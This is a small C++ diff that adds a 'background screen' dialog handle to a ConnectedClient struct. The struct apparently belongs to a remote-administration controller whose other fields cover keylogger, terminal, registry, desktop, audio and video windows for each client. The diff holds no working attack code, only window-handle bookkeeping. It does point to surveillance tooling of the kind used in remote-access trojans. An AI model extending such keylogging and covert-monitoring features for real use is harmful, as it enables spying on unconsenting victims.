@@ -65,6 +65,7 @@ struct ConnectedClient {
     HWND hWindowDlg;
     HWND hFileDlg;
     HWND hKeylogDlg;
+    HWND hBackgroundDlg; // 后台屏幕管理窗口
     HWND hAudioDlg;  // 添加音频窗口
     HWND hVideoDlg;  // 添加视频窗口
 
@@ -104,7 +105,7 @@ struct ConnectedClient {
                         hProcessDlg(NULL), hModuleDlg(NULL), hNetworkDlg(NULL), hTerminalDlg(NULL),
                         hServiceDlg(NULL), hRegistryDlg(NULL), hDesktopDlg(NULL),
                         hWindowDlg(NULL), hFileDlg(NULL), hKeylogDlg(NULL),
-                        hAudioDlg(NULL), hVideoDlg(NULL),
+                        hBackgroundDlg(NULL), hAudioDlg(NULL), hVideoDlg(NULL),
                         isMonitoring(false), info{}, listIndex(-1),
                         hFileDownload(INVALID_HANDLE_VALUE),
                         totalDownloadSize(0), currentDownloadSize(0),
